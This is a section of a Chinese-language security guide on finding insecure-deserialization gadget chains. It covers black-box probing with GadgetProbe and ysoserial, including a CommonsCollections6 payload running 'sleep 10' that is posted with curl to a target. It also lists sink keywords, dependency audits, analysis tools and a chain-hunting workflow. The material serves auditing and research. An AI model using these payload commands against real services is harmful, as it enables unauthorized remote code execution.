## 二、Gadget 挖掘方法论

### 2.1 动态分析（黑盒/半黑盒）
```bash
# 1. 利用工具批量爆破 Gadget 存在性（GadgetProbe：通过反序列化错误信息探测 classpath 类）
java -jar GadgetProbe.jar -u http://target/endpoint -p rO0AB...(Payload) -d "X-Api: test"

# 2. 无回显场景用 DNS/延迟侧信道判断链是否生效
java -jar ysoserial.jar CommonsCollections6 'sleep 10' > probe.ser
curl -s -X POST --data-binary @probe.ser -H "Content-Type: application/x-java-serialized-object" \
  http://target/api -w "耗时:%{time_total}s"   # 若 10s+ → 链生效

# 3. 逐类注入测试（ClassPathScanner / 自写 PoC）：对候选类做"存在性+readObject 行为"探测
```

### 2.2 静态审计（白盒）
```bash
# 搜索反序列化入口（全语言通用关键字）
# Java: readObject|readUnshared|XMLDecoder|XStream|fromXML|ObjectMapper.*enableDefaultTyping|JSON.parse|HessianInput|Kryo.read
# PHP: unserialize|phar://|yaml_parse|__wakeup|__destruct
# Python: pickle.loads|cPickle|yaml.load|unsafe_load|torch.load|shelve.open|marshal.loads|jsonpickle.decode
# .NET: BinaryFormatter|LosFormatter|SoapFormatter|NetDataContractSerializer|TypeNameHandling|Deserialize
# Ruby: Marshal.load|YAML.load|Psych.load|create_additions
# Node: serialize|unserialize|node-serialize|_$$ND_FUNC$$

# 依赖版本审计（checkknown CVE）
mvn dependency:tree | grep -iE "commons-collections|fastjson|jackson|snakeyaml|xstream"
pip-audit; pipenv check; bundle-audit; composer audit; dotnet list package --vulnerable
```

### 2.3 链式搜索与自动化挖掘工具
- **CodeQL**：`java`/`python`/`csharp` 数据流查询——定义 `readObject` 为 source，`Runtime.exec`/`ProcessBuilder` 为 sink，自动发现可利用链
- **Semgrep**：轻量正则/模式匹配规则（社区有大量反序列化规则集），适合 CI 集成
- **JShell/wh1sper/Automated Gadget Chain Discovery**：自动搜索"反序列化入口→危险方法"的调用链
- **SerializationDumper**：解析 Java 序列化字节流，逆向分析协议结构、手工改包绕过
- **pickletools**（Python 标准库）：`pickletools.dis(payload)` 逐步解析 opcode，理解与修改 pickle 指令
- **chain 生成辅助**：ysoserial 源码本身就是"链模板库"；`ysoserial-modified`/`ysoserial-ng` 提供更多变体

### 2.4 挖掘流程（专家套路）
```
1. 枚举所有"网络输入→反序列化"路径（HTTP body/Cookie/Header/消息队列/RPC/文件上传）
2. 收集目标 classpath 依赖清单（报错堆栈/Jar 泄露/GadgetProbe/目录浏览/错误页面）
3. 语义检索：找出所有可被 readObject 触发的入口类（readObject/readResolve 重写类）
4. 从入口类出发做调用图分析，找可控参数是否到达危险 Sink（exec/eval/反射 newInstance/jndi lookup）
5. 对候选链用 ysoserial 框架模板化验证；逐个版本、逐个 JDK 适配
6. 优先级：无第三方依赖的 JDK-only 链 > 高频依赖链（CC/CB）> 框架特有链
```

